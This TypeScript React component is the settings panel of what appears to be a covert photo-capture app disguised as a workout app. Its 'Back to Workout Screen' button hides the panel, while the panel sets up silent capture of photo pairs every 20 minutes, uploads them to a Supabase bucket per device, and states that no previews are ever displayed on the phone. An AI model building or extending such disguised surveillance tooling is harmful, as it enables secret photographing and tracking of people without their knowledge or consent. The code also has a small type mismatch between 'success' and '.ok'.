import React, { useState } from 'react';
import {
  X,
  Shield,
  Cloud,
  Camera,
  CheckCircle,
  AlertCircle,
  Clock,
  Terminal,
  RefreshCw,
  Trash2,
} from 'lucide-react';
import { SecurityConfig, PhotoPair, LogEvent } from '../types';
import { testSupabaseConnection } from '../utils/supabase';

interface StealthSettingsModalProps {
  isOpen: boolean;
  onClose: () => void;
  config: SecurityConfig;
  onUpdateConfig: (cfg: Partial<SecurityConfig>) => void;
  currentPair: PhotoPair | null;
  logs: LogEvent[];
  onClearLogs: () => void;
  onAddLog: (msg: string, type?: LogEvent['type'], details?: string) => void;
  onManualSnap: () => void;
  isCapturing: boolean;
  remainingSeconds: number;
  totalCycleSeconds: number;
}

export const StealthSettingsModal: React.FC<StealthSettingsModalProps> = ({
  isOpen,
  onClose,
  config,
  onUpdateConfig,
  currentPair,
  logs,
  onClearLogs,
  onAddLog,
  onManualSnap,
  isCapturing,
  remainingSeconds,
  totalCycleSeconds,
}) => {
  const [testingConn, setTestingConn] = useState(false);
  const [connResult, setConnResult] = useState<{ success: boolean; message: string } | null>(null);

  if (!isOpen) return null;

  const handleTestConnection = async () => {
    setTestingConn(true);
    setConnResult(null);
    onAddLog(`Testing connection to Supabase bucket "${config.supabaseBucket}"...`, 'info');

    const res = await testSupabaseConnection(
      config.supabaseUrl,
      config.supabaseAnonKey,
      config.supabaseBucket
    );

    setTestingConn(false);
    setConnResult(res);

    if (res.ok) {
      onAddLog(`Supabase connection confirmed healthy: ${res.message}`, 'success');
    } else {
      onAddLog(`Supabase connection failed: ${res.message}`, 'error');
    }
  };

  return (
    <div className="fixed inset-0 z-50 flex items-center justify-center p-4 bg-black/80 backdrop-blur-md">
      <div className="bg-slate-900 border border-slate-800 rounded-3xl max-w-2xl w-full max-h-[90vh] overflow-hidden flex flex-col shadow-2xl">
        {/* Header */}
        <div className="px-6 py-4 border-b border-slate-800 flex items-center justify-between bg-slate-950/60">
          <div className="flex items-center gap-2.5">
            <div className="w-8 h-8 rounded-xl bg-emerald-500/10 border border-emerald-500/20 flex items-center justify-center text-emerald-400">
              <Shield className="w-4 h-4" />
            </div>
            <div>
              <h3 className="text-sm font-bold text-white">System Console & Cloud Sync</h3>
              <p className="text-[11px] text-slate-400">Device ID & Supabase Transmission Settings</p>
            </div>
          </div>
          <button
            onClick={onClose}
            className="p-1.5 rounded-lg bg-slate-800 hover:bg-slate-700 text-slate-400 hover:text-white transition-colors"
          >
            <X className="w-4 h-4" />
          </button>
        </div>

        {/* Scrollable Content */}
        <div className="p-6 overflow-y-auto space-y-6 text-xs">
          {/* Cloud Bucket Status & Manual Capture */}
          <div className="bg-slate-950/80 border border-slate-800 rounded-2xl p-4 flex flex-col gap-3">
            <div className="flex items-center justify-between">
              <div className="flex items-center gap-2">
                <Cloud className="w-4 h-4 text-emerald-400" />
                <span className="font-semibold text-white">Supabase Storage Target</span>
              </div>
              <span className="font-mono text-[10px] px-2 py-0.5 rounded bg-emerald-500/10 text-emerald-400 border border-emerald-500/20">
                Bucket: {config.supabaseBucket}
              </span>
            </div>

            <p className="text-slate-400 text-[11px]">
              Photos are captured silently and streamed to <code className="text-emerald-300 font-mono">{config.supabaseBucket}/{config.deviceId}/photo_*.jpg</code>. No photo previews are ever displayed on this phone.
            </p>

            <div className="flex flex-wrap items-center gap-2 pt-1">
              <button
                onClick={handleTestConnection}
                disabled={testingConn}
                className="px-3 py-1.5 rounded-xl bg-slate-800 hover:bg-slate-700 text-slate-200 border border-slate-700 flex items-center gap-1.5 transition-colors font-medium"
              >
                <RefreshCw className={`w-3.5 h-3.5 ${testingConn ? 'animate-spin' : ''}`} />
                <span>{testingConn ? 'Verifying...' : 'Test Bucket Connection'}</span>
              </button>

              <button
                onClick={onManualSnap}
                disabled={isCapturing}
                className="px-3 py-1.5 rounded-xl bg-emerald-600 hover:bg-emerald-500 text-white flex items-center gap-1.5 transition-colors font-medium shadow-md shadow-emerald-950"
              >
                <Camera className="w-3.5 h-3.5" />
                <span>{isCapturing ? 'Capturing 2 Snapshots...' : 'Capture Photo Pair Now'}</span>
              </button>
            </div>

            {connResult && (
              <div className={`p-2.5 rounded-xl border flex items-center gap-2 text-[11px] ${
                connResult.ok
                  ? 'bg-emerald-500/10 border-emerald-500/30 text-emerald-300'
                  : 'bg-rose-500/10 border-rose-500/30 text-rose-300'
              }`}>
                {connResult.ok ? <CheckCircle className="w-4 h-4 shrink-0" /> : <AlertCircle className="w-4 h-4 shrink-0" />}
                <span>{connResult.message}</span>
              </div>
            )}
          </div>

          {/* Device ID & Interval Mode */}
          <div className="grid grid-cols-1 sm:grid-cols-2 gap-4">
            <div className="bg-slate-950/80 border border-slate-800 rounded-2xl p-4 flex flex-col gap-2">
              <label className="text-slate-300 font-semibold">Device Identifier</label>
              <input
                type="text"
                value={config.deviceId}
                onChange={(e) => onUpdateConfig({ deviceId: e.target.value.trim() || 'Phone_01' })}
                placeholder="e.g. Phone_01"
                className="px-3 py-2 rounded-xl bg-slate-900 border border-slate-700 text-white font-mono text-xs focus:outline-none focus:border-emerald-500"
              />
              <span className="text-[10px] text-slate-500">Each smartphone uses a distinct folder in Supabase</span>
            </div>

            <div className="bg-slate-950/80 border border-slate-800 rounded-2xl p-4 flex flex-col justify-between gap-2">
              <div className="flex items-center justify-between">
                <span className="text-slate-300 font-semibold">10-Second Test Mode</span>
                <input
                  type="checkbox"
                  checked={config.testMode}
                  onChange={(e) => onUpdateConfig({ testMode: e.target.checked })}
                  className="w-4 h-4 rounded text-emerald-600 bg-slate-800 border-slate-700 cursor-pointer"
                />
              </div>
              <p className="text-[11px] text-slate-400">
                {config.testMode ? '⚡ Test Mode (Captures every 10 seconds)' : '⏱️ Standard Mode (Captures every 20 minutes)'}
              </p>
              <div className="text-[11px] text-emerald-400 font-mono">
                Next cycle in: {Math.floor(remainingSeconds / 60)}m {remainingSeconds % 60}s / {totalCycleSeconds}s
              </div>
            </div>
          </div>

          {/* Recent Transmission Status */}
          <div className="bg-slate-950/80 border border-slate-800 rounded-2xl p-4 space-y-2 font-mono">
            <div className="flex items-center justify-between text-slate-300 font-sans font-semibold">
              <span>Recent Transmission Slot</span>
              <span className="text-[10px] text-slate-500">{currentPair?.cycleTimestamp || 'Standby'}</span>
            </div>

            <div className="p-2 bg-slate-900 border border-slate-800 rounded-xl flex items-center justify-between text-[11px]">
              <span className="text-slate-300 truncate max-w-[260px]">
                {currentPair?.photo1?.cloudPath || `${config.supabaseBucket}/${config.deviceId}/photo_..._1.jpg`}
              </span>
              <span className={`px-2 py-0.5 rounded text-[10px] ${
                currentPair?.photo1?.uploadStatus === 'success' ? 'bg-emerald-500/10 text-emerald-400' : 'bg-slate-800 text-slate-400'
              }`}>
                {currentPair?.photo1?.uploadStatus || 'Standby'}
              </span>
            </div>

            <div className="p-2 bg-slate-900 border border-slate-800 rounded-xl flex items-center justify-between text-[11px]">
              <span className="text-slate-300 truncate max-w-[260px]">
                {currentPair?.photo2?.cloudPath || `${config.supabaseBucket}/${config.deviceId}/photo_..._2.jpg`}
              </span>
              <span className={`px-2 py-0.5 rounded text-[10px] ${
                currentPair?.photo2?.uploadStatus === 'success' ? 'bg-emerald-500/10 text-emerald-400' : 'bg-slate-800 text-slate-400'
              }`}>
                {currentPair?.photo2?.uploadStatus || 'Standby'}
              </span>
            </div>
          </div>

          {/* Activity Logs */}
          <div className="bg-slate-950/80 border border-slate-800 rounded-2xl p-4 space-y-2">
            <div className="flex items-center justify-between">
              <div className="flex items-center gap-2 text-slate-300 font-semibold">
                <Terminal className="w-3.5 h-3.5 text-emerald-400" />
                <span>Transmission Logs ({logs.length})</span>
              </div>
              <button
                onClick={onClearLogs}
                className="text-[10px] text-slate-400 hover:text-rose-400 flex items-center gap-1 transition-colors"
              >
                <Trash2 className="w-3 h-3" />
                <span>Clear</span>
              </button>
            </div>

            <div className="h-36 overflow-y-auto font-mono text-[10px] space-y-1 p-2 bg-slate-900 rounded-xl border border-slate-800">
              {logs.map((l) => (
                <div key={l.id} className="text-slate-400">
                  <span className="text-slate-500 mr-1.5">[{l.timestamp}]</span>
                  <span className={
                    l.type === 'success' ? 'text-emerald-400' :
                    l.type === 'error' ? 'text-rose-400' :
                    l.type === 'warning' ? 'text-amber-400' : 'text-slate-300'
                  }>
                    {l.message}
                  </span>
                </div>
              ))}
            </div>
          </div>
        </div>

        {/* Footer */}
        <div className="px-6 py-3 border-t border-slate-800 bg-slate-950/60 flex items-center justify-end">
          <button
            onClick={onClose}
            className="px-4 py-2 rounded-xl bg-emerald-600 hover:bg-emerald-500 text-white text-xs font-semibold shadow-md shadow-emerald-950 transition-colors"
          >
            Back to Workout Screen
          </button>
        </div>
      </div>
    </div>
  );
};
